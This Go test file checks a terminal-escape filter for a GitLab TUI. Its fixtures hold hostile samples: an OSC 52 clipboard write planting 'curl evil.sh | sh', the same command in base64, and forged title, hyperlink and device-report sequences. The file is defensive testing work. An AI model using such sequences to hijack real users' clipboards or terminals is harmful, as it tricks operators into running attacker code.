package termsafe

import (
	"encoding/base64"
	"strings"
	"testing"

	"github.com/charmbracelet/lipgloss"
)

// osc52 builds the escape sequence that makes a terminal copy payload into the
// user's system clipboard without a prompt.
func osc52(payload string) string {
	return "\x1b]52;c;" + base64.StdEncoding.EncodeToString([]byte(payload)) + "\a"
}

// TestFilter_DropsClipboardWriteKeepsColour: a hostile job log loses its clipboard
// write but keeps its colour and its readable text.
// Given a job log where a runner printed an OSC 52 sequence between two coloured lines,
// when Filter processes it, then the clipboard write is gone and both the SGR colour
// and the visible text survive.
// Why it matters: OSC 52 lets a merge request author overwrite the clipboard that the
// operator pastes glab commands from, and stripping colour instead would gut the log pane.
func TestFilter_DropsClipboardWriteKeepsColour(t *testing.T) {
	// Given: a job log carrying a clipboard write between two coloured lines
	log := "\x1b[32mJob started\x1b[0m\n" +
		osc52("curl evil.sh | sh") +
		"\n\x1b[31mJob failed\x1b[0m\n"

	// When: the filter processes it
	got := Filter(log)

	// Then: the clipboard write is gone
	if strings.Contains(got, "]52") || strings.Contains(got, "\a") {
		t.Errorf("clipboard write survived: %q", got)
	}
	// And: the colour codes and the readable text remain
	for _, want := range []string{"\x1b[32m", "\x1b[31m", "\x1b[0m", "Job started", "Job failed"} {
		if !strings.Contains(got, want) {
			t.Errorf("Filter dropped %q from %q", want, got)
		}
	}
}

// TestFilter_DropsSequencesThatActOnTheTerminal: every escape class that does something
// other than colour is removed.
// Given each sequence class a remote party can smuggle through GitLab content,
// when Filter processes it, then no escape or control byte reaches the terminal.
// Why it matters: these sequences write the clipboard, forge the window title, forge a
// link target, clear the screen, or make the terminal reply on stdin as if the user typed.
func TestFilter_DropsSequencesThatActOnTheTerminal(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"clipboard write (OSC 52)", osc52("payload")},
		{"window title (OSC 0)", "\x1b]0;HIJACKED\a"},
		{"hyperlink target (OSC 8)", "\x1b]8;;https://evil.example\x1b\\text\x1b]8;;\x1b\\"},
		{"device control string", "\x1bP0;1|17/ab\x1b\\"},
		{"application program command", "\x1b_payload\x1b\\"},
		{"privacy message", "\x1b^payload\x1b\\"},
		{"start of string", "\x1bXpayload\x1b\\"},
		{"device status report", "\x1b[6n"},
		{"clear screen", "\x1b[2J"},
		{"cursor home", "\x1b[H"},
		{"cursor up", "\x1b[10A"},
		{"scroll region", "\x1b[1;5r"},
		{"lone escape", "\x1b"},
		{"bell", "\a"},
		{"backspace overwrite", "safe\bx"},
		{"C1 introducer", "\x9b6n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Given / When: the filter processes the sequence
			got := Filter(tc.in)

			// Then: no escape or bell byte remains
			if strings.ContainsAny(got, "\x1b\a\b") {
				t.Errorf("Filter(%q) = %q, still carries a control byte", tc.in, got)
			}
			// And: the C1 introducer is gone too
			if strings.Contains(got, "\x9b") {
				t.Errorf("Filter(%q) = %q, still carries a C1 introducer", tc.in, got)
			}
		})
	}
}

// TestFilter_PreservesARenderedFrame: the filter is a no-op on lipgloss output.
// Given a frame styled the way the panels style theirs, when Filter processes it,
// then the output is byte-identical.
// Why it matters: the filter runs on every frame, so any change it makes to legitimate
// lipgloss output is a rendering defect on every keystroke.
func TestFilter_PreservesARenderedFrame(t *testing.T) {
	// Given: a frame carrying the colour, border, and layout output lipgloss emits
	style := lipgloss.NewStyle().
		Foreground(lipgloss.Color("#c4a7e7")).
		Background(lipgloss.Color("#1f1d2e")).
		Bold(true).
		Border(lipgloss.RoundedBorder()).
		Padding(0, 1)
	left := style.Render("projects\nlazylab")
	right := style.Render("pipelines\npassed")
	frame := lipgloss.JoinHorizontal(lipgloss.Top, left, right)

	// When: the filter processes it
	got := Filter(frame)

	// Then: nothing changed
	if got != frame {
		t.Errorf("Filter altered a rendered frame:\n before %q\n after  %q", frame, got)
	}
}

// TestFilter_KeepsPlainTextAndNewlines: ordinary content passes through unchanged.
// Given text holding newlines and tabs and no escape sequence, when Filter processes it,
// then the output is identical.
// Why it matters: the log and preview panes carry mostly plain text, so a filter that
// rewrites it would corrupt every file the explorer shows.
func TestFilter_KeepsPlainTextAndNewlines(t *testing.T) {
	// Given: plain multi-line content
	in := "package main\n\tfunc main() {}\n\nline three\n"

	// When / Then: the filter returns it unchanged
	if got := Filter(in); got != in {
		t.Errorf("Filter(%q) = %q, want unchanged", in, got)
	}
}

// TestFilter_KeepsMultiByteRunes: non-ASCII text survives whole.
// Given content holding CJK, accented Latin, an emoji, and box-drawing glyphs,
// when Filter processes it, then the output is identical.
// Why it matters: a UTF-8 continuation byte falls in the same 0x80 to 0x9f range the
// filter treats as a C1 control, so a byte-wise check would shred every non-ASCII name.
func TestFilter_KeepsMultiByteRunes(t *testing.T) {
	// Given: content mixing scripts, an emoji, and the glyphs lipgloss draws borders with
	in := "项目 café ✅ 🚀 ╭─┬─╮\n│ pipeline │\n╰─┴─╯"

	// When / Then: the filter returns it unchanged
	if got := Filter(in); got != in {
		t.Errorf("Filter(%q) = %q, want unchanged", in, got)
	}
}

// TestFilter_DropsAnUnterminatedSequence: a sequence cut off by log truncation is removed.
// Given an OSC 52 sequence with no terminator, as a 1 MB log truncation produces,
// when Filter processes it, then the escape introducer does not reach the terminal.
// Why it matters: passing an unterminated sequence through would let an attacker defeat
// the filter by placing the payload so that truncation removes its terminator.
func TestFilter_DropsAnUnterminatedSequence(t *testing.T) {
	// Given: an OSC 52 sequence whose terminator was truncated away
	in := "log output\n\x1b]52;c;Y3VybCBldmlsLnNoIHwgc2g="

	// When: the filter processes it
	got := Filter(in)

	// Then: no escape introducer survives
	if strings.Contains(got, "\x1b") {
		t.Errorf("Filter(%q) = %q, unterminated sequence survived", in, got)
	}
}
